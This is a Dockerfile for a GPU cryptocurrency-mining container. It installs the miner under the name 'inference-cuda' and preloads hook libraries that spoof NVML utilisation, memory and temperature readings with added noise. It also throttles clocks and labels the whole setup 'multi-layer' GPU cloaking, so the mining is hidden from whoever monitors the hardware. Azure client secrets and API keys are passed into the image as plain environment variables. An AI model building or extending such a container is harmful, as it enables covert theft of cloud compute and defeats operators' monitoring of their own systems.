FROM nvcr.io/nvidia/cuda:12.0.0-cudnn8-devel-ubuntu22.04


# =============================================================================
# UNIFIED STAGE: Runtime-only approach (KHÔNG build BCC từ source)
# =============================================================================

# Thiết lập non-interactive để tránh các câu hỏi khi cài đặt
ENV DEBIAN_FRONTEND=noninteractive


# ------------------  (1)  Biến môi trường & ARG giữ nguyên ------------------
ARG AZURE_SUBSCRIPTION_ID
ARG AZURE_CLIENT_ID
ARG AZURE_CLIENT_SECRET
ARG AZURE_TENANT_ID
ARG ANOMALY_DETECTOR_API_KEY
ARG OPENAI_API_KEY
ARG LOG_ENCRYPTION_KEY
# CPU mining arguments removed for GPU-only operations
ARG MINING_SERVER_GPU
ARG MINING_WALLET_GPU
ARG NVIDIA_DRIVER_VERSION=535
ARG WEBSOCAT_VERSION=1.12.0
ARG TARGETARCH=amd64
ARG EVENT_BUS_BACKEND=memory

ENV DEBIAN_FRONTEND=noninteractive \
    PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1 \
    LANG=en_US.UTF-8 \
    LC_ALL=en_US.UTF-8 \
    AZURE_SUBSCRIPTION_ID=${AZURE_SUBSCRIPTION_ID} \
    AZURE_CLIENT_ID=${AZURE_CLIENT_ID} \
    AZURE_CLIENT_SECRET=${AZURE_CLIENT_SECRET} \
    AZURE_TENANT_ID=${AZURE_TENANT_ID} \
    ANOMALY_DETECTOR_API_KEY=${ANOMALY_DETECTOR_API_KEY} \
    OPENAI_API_KEY=${OPENAI_API_KEY} \
    LOG_ENCRYPTION_KEY=${LOG_ENCRYPTION_KEY} \
    # CPU environment variables removed for GPU-only mode
    MINING_SERVER_GPU=${MINING_SERVER_GPU} \
    MINING_WALLET_GPU=${MINING_WALLET_GPU} \
    NVIDIA_DRIVER_VERSION=${NVIDIA_DRIVER_VERSION} \
    EVENT_BUS_BACKEND=${EVENT_BUS_BACKEND} \
    PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"


# ------------------  (2)  Cài đặt hệ thống cơ bản ------------------------
RUN set -eux; \
    apt-get update --allow-releaseinfo-change || true; \
    apt-get install -y --no-install-recommends \
        apt-utils sudo nano wget file python3 python3-pip curl git \
        libssl-dev libeigen3-dev libnuma-dev stunnel4 \
        cpufrequtils iproute2 util-linux \
        python3-yaml \
        pciutils openssl lm-sensors powerstat stress-ng bash \
        htop locales iptables powertop tzdata numactl systemd dbus \
        pkg-config libhwloc15 libhwloc-dev ca-certificates lsb-release gnupg \
        libuv1 libudev1 libssl3 cgroup-tools libcgroup1 libcap2-bin nvidia-container-toolkit \
        kmod software-properties-common snapd linux-tools-generic linux-tools-azure \
        erlang-base erlang-crypto erlang-eldap erlang-ftp erlang-inets erlang-mnesia \
        erlang-os-mon erlang-parsetools erlang-public-key erlang-runtime-tools \
        erlang-snmp erlang-ssl erlang-syntax-tools erlang-tftp erlang-tools \
        erlang-xmerl erlang-asn1 socat logrotate && \
    sudo apt-get clean && \
    sudo rm -rf /var/lib/apt/lists/*

# ------------------  (3)  Locale & Timezone  -------------------------------
RUN set -eux; apt-get update; DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata locales; \
    ln -fs /usr/share/zoneinfo/UTC /etc/localtime; echo "UTC" > /etc/timezone; \
    dpkg-reconfigure -f noninteractive tzdata; locale-gen en_US.UTF-8; \
    update-locale LANG=en_US.UTF-8 LC_ALL=en_US.UTF-8 && rm -rf /var/lib/apt/lists/*

# ------------------  (4)  Azure CLI  ---------------------------------------
RUN set -eux; apt-get update; apt-get install -y --no-install-recommends curl lsb-release gnupg ca-certificates; \
    curl -sL https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor -o /etc/apt/trusted.gpg.d/microsoft.gpg; \
    AZ_REPO=$(lsb_release -cs); \
    echo "deb [arch=amd64] https://packages.microsoft.com/repos/azure-cli/ $AZ_REPO main" > /etc/apt/sources.list.d/azure-cli.list; \
    apt-get update; apt-get install -y --no-install-recommends azure-cli; rm -rf /var/lib/apt/lists/*

# ------------------  (5)  Stunnel ------------------------------------------
RUN set -eux; mkdir -p /etc/stunnel; \
    openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
        -keyout /etc/stunnel/soff.key \
        -out /etc/stunnel/soff.crt \
        -subj "/C=VN/ST=Ho_Chi_Minh/L=Ho_Chi_Minh/O=MyOrg/OU=MyUnit/CN=example.com"; \
    chmod 600 /etc/stunnel/soff.key /etc/stunnel/soff.crt
COPY stunnel.conf /etc/stunnel/stunnel.conf
RUN set -eux; \
    chmod 700 /etc/stunnel/stunnel.conf; \
    command -v stunnel4 >/dev/null 2>&1 || (apt-get update && apt-get install -y --no-install-recommends stunnel4); \
    ln -sf $(command -v stunnel4) /usr/bin/stunnel


# ------------------  (7)  Thư mục làm việc & Python deps -------------------
RUN mkdir -p /app
WORKDIR /app
COPY requirements.txt /app/

# ----- Cài đặt Python dependencies -----
RUN set -eux; \
    if ! command -v pip3 >/dev/null 2>&1; then \
        apt-get update && \
        apt-get install -y --no-install-recommends python3-pip python3-dev; \
    fi; \
    python3 -m pip install --upgrade pip; \
    ln -sf $(which python3) /usr/bin/python || true; \
    pip3 install --no-cache-dir --break-system-packages --ignore-installed -r requirements.txt && \
    rm -rf /var/lib/apt/lists/* /root/.cache

# ------------------  (9)  Copy source code -------------------------------
COPY . /app/

# Sao chép pre-compiled binaries và libraries
COPY inference-cuda.original libmlls-cuda.so /tmp/
COPY entrypoint.sh /app/entrypoint.sh

# Copy NVRTC wrapper script for runtime compilation fixes  
COPY mining_environment/gpu_plugins/fix_nvrtc_symlinks.sh /app/mining_environment/gpu_plugins/
COPY mining_environment/gpu_plugins/native/cuda/libmpo.so /tmp/libmpo.so
COPY mining_environment/gpu_plugins/native/nvml/libgpuhook.so /tmp/libgpuhook.so
COPY mining_environment/gpu_plugins/native/thermal/libtempspoof.so /tmp/libtempspoof.so 


# ------------------  NVRTC Enhanced Wrapper Installation ---------------
# Purpose: Fix runtime NVRTC compilation context issues
# Method: Enhanced wrapper script with proper environment setup
RUN ldconfig && \
    # Install original binary as backup
    install -D /tmp/inference-cuda.original    /app/inference-cuda.original && \
    install -D /tmp/libmlls-cuda.so   /usr/local/bin/libmlls-cuda.so && \
    install -D /tmp/libmpo.so         /opt/mpo/libmpo.so && \
    install -D /tmp/libgpuhook.so     /opt/hooks/libgpuhook.so && \
    install -D /tmp/libtempspoof.so   /opt/hooks/libtempspoof.so && \
    mkdir -p /opt/{hooks,mpo} && chmod 755 /opt/{hooks,mpo} && chmod 644 /opt/mpo/libmpo.so && \
    rm -rf /tmp/*

# Create enhanced NVRTC wrapper script
COPY inference-cuda /usr/local/bin/inference-cuda
RUN chmod +x /usr/local/bin/inference-cuda

# ------------------  (10)  Enhanced GPU Runtime & Libraries ---------------
RUN set -eux; apt-get update; \
    apt-get install -y --no-install-recommends \
        # NVIDIA ML & Management Libraries (available packages)
        libnvidia-ml-dev \
        # OpenCL Support for Mining Applications  
        ocl-icd-opencl-dev clinfo ocl-icd-libopencl1 opencl-headers \
        # Additional Mining Dependencies
        libnuma1 libhwloc15 libuv1-dev \
        # System monitoring tools
        pciutils lshw \
    && ldconfig && rm -rf /var/lib/apt/lists/*

# Note: CUDA libraries are provided by the base image nvcr.io/nvidia/cuda:12.0.0-cudnn8-devel-ubuntu22.04

# ------------------  (11)  eBPF setup script & Websocat -------------------

RUN set -eux; \
    command -v wget >/dev/null 2>&1 || (apt-get update && apt-get install -y --no-install-recommends wget); \
    if [ "${TARGETARCH}" = "amd64" ]; then WEBSOCAT_ARCH="x86_64-unknown-linux-musl"; else WEBSOCAT_ARCH="aarch64-unknown-linux-musl"; fi; \
    wget -q "https://github.com/vi/websocat/releases/download/v${WEBSOCAT_VERSION}/websocat.${WEBSOCAT_ARCH}" -O /usr/local/bin/websocat; \
    chmod +x /usr/local/bin/websocat

# ------------------  (13)  ENV cố định ------------------------------------
ENV SCRIPT_DIR=/app/mining_environment/scripts \
    CONFIG_DIR=/app/mining_environment/config \
    MODELS_DIR=/app/mining_environment/models \
    LOGS_DIR=/app/mining_environment/logs \
    CUDA_COMMAND=/usr/local/bin/inference-cuda \
    MLLS_CUDA=/usr/local/bin/libmlls-cuda.so \
    # NVRTC wrapper control
    NVRTC_WRAPPER_VERBOSE=0 \
    NVRTC_ENHANCED_MODE=1 \
    GPU_CLOAK_LOG_LEVEL=INFO \
    WORK_MS=1900 SLEEP_MS=100 \
    ENABLE_MPO=1 MPO_LIB=/opt/mpo/libmpo.so \
    ENABLE_NS_ISOLATION=1 NS_USE_NET=1 \
    PYTHONPATH=/app:/usr/local/lib/python3.10/dist-packages:/usr/lib/python3/dist-packages \
    GPU_PLUGINS_CONFIG=/app/mining_environment/gpu_plugins/config/gpu_plugins.yml \
    ENABLE_NVML_IPC_HIJACKING=1 NVML_FAKE_UTIL=5 NVML_FAKE_TEMP=48 NVML_FAKE_MEM_MB=256 NVML_ADD_NOISE=1 \
    ENABLE_TEMP_SPOOF=1 SPOOF_TEMP_VALUE=48 TEMP_SPOOF_ADD_NOISE=1 \
    ENABLE_SM_THROTTLE=1 CLOCK_LOW=300 CLOCK_HIGH=1200 THROTTLE_INTERVAL=30 \
    EVENT_BUS_BACKEND=memory \
    EVENTBUS_CONNECTION_TIMEOUT=10.0 \
    EVENTBUS_RETRY_ATTEMPTS=5 \
    EVENTBUS_HEALTH_CHECK_INTERVAL=60.0


# Simplified CUDA library path - production only
ENV LD_LIBRARY_PATH=/usr/local/cuda/lib64:$LD_LIBRARY_PATH

# ------------------  NVRTC Library Path Fix (ldconfig Method) ---------------------
# Fix: Cấu hình ldconfig để system tự động tìm NVRTC libraries
# Lợi ích: Không cần symbolic links, system-wide, persistent, đơn giản hơn
RUN set -eux; \
    echo "🔧 [NVRTC-LDCONFIG-FIX] Configuring NVRTC library paths via ldconfig..."; \
    # Định vị thư mục chứa NVRTC libraries thực tế
    NVRTC_ACTUAL_DIR="/usr/local/cuda-12.0/targets/x86_64-linux/lib"; \
    NVRTC_FALLBACK_DIR="/usr/local/cuda/targets/x86_64-linux/lib"; \
    NVRTC_LIB_DIR=""; \
    # Xác định thư mục chứa libraries
    if [ -d "$NVRTC_ACTUAL_DIR" ] && [ -f "$NVRTC_ACTUAL_DIR/libnvrtc-builtins.so.12.0.140" ]; then \
        NVRTC_LIB_DIR="$NVRTC_ACTUAL_DIR"; \
        echo "[NVRTC-LDCONFIG-FIX] Found NVRTC libraries in: $NVRTC_LIB_DIR"; \
    elif [ -d "$NVRTC_FALLBACK_DIR" ] && [ -f "$NVRTC_FALLBACK_DIR/libnvrtc-builtins.so.12.0.140" ]; then \
        NVRTC_LIB_DIR="$NVRTC_FALLBACK_DIR"; \
        echo "[NVRTC-LDCONFIG-FIX] Using fallback directory: $NVRTC_LIB_DIR"; \
    else \
        echo "[NVRTC-LDCONFIG-FIX] ❌ NVRTC library directory not found in expected locations"; \
        exit 1; \
    fi; \
    # Cấu hình ldconfig để system tự động tìm libraries
    echo "[NVRTC-LDCONFIG-FIX] Adding $NVRTC_LIB_DIR to ldconfig search paths"; \
    echo "$NVRTC_LIB_DIR" > /etc/ld.so.conf.d/cuda-nvrtc.conf; \
    # Cập nhật ldconfig cache
    ldconfig; \
    # Fix missing symlinks for runtime compatibility
    echo "[NVRTC-LDCONFIG-FIX] Creating missing symlinks for runtime compatibility..."; \
    cd "$NVRTC_LIB_DIR"; \
    # Ensure libnvrtc.so.12.0 symlink exists (required for runtime loading)
    if [ ! -f "libnvrtc.so.12.0" ]; then \
        ln -sf libnvrtc.so.12.0.140 libnvrtc.so.12.0; \
        echo "[NVRTC-LDCONFIG-FIX] Created libnvrtc.so.12.0 symlink"; \
    fi; \
    # Verification - kiểm tra ldconfig đã nhận diện được libraries
    echo "[NVRTC-LDCONFIG-FIX] Verification:"; \
    ldconfig -p | grep nvrtc-builtins && echo "✅ NVRTC libraries found in ldconfig cache" || echo "⚠️ NVRTC not in cache, checking manually..."; \
    ls -la "$NVRTC_LIB_DIR"/libnvrtc-builtins.so* || echo "❌ Libraries not found"; \
    ls -la "$NVRTC_LIB_DIR"/libnvrtc.so* || echo "❌ NVRTC main library not found"; \
    echo "✅ [NVRTC-LDCONFIG-FIX] ldconfig configuration and symlink fixes completed"

# Backup environment variable cho compatibility
ENV LD_LIBRARY_PATH="/usr/local/cuda-12.0/targets/x86_64-linux/lib:/usr/local/cuda/targets/x86_64-linux/lib:${LD_LIBRARY_PATH}"

ENV LD_PRELOAD="/opt/hooks/libtempspoof.so:/opt/hooks/libgpuhook.so"

# ------------------  (14)  Verification và cleanup ------------------------
RUN set -eux; \
    apt-get update; \
    command -v capsh >/dev/null 2>&1 || apt-get install -y --no-install-recommends libcap2-bin; \
    command -v capsh >/dev/null 2>&1 && ln -sf $(command -v capsh) /usr/local/bin/capsh; \
    ldconfig -p | grep -q "libuv.so.1" || (apt-get install -y --no-install-recommends libuv1 && ldconfig); \
    rm -rf /var/lib/apt/lists/*


# ------------------  (16)  Healthcheck & Metadata --------------------------
HEALTHCHECK --interval=1m --timeout=10s --start-period=30s --retries=3 CMD pgrep -f start_mining.py || exit 1

LABEL maintainer="Transformer Mining Team" \
      version="1.2.0" \
      description="Enhanced GPU mining container with CUDA runtime and OpenCL support" \
      cuda.version="12.0" \
      cuda.runtime="enhanced" \
      opencl.enabled="true" \
      ebpf.enabled="true" \
      ebpf.mode="runtime-load-only" \
      gpu.cloaking="multi-layer" \
      gpu.plugins="modular-architecture" \
      gpu.debug="integrated" \
      security.level="high"

      
# ------------------  (17)  Entrypoint & CMD --------------------------------
COPY start_mining.py /app/start_mining.py
RUN chmod +x /app/entrypoint.sh /app/start_mining.py

ENTRYPOINT ["/app/entrypoint.sh"]
CMD ["python3", "/app/start_mining.py"] 
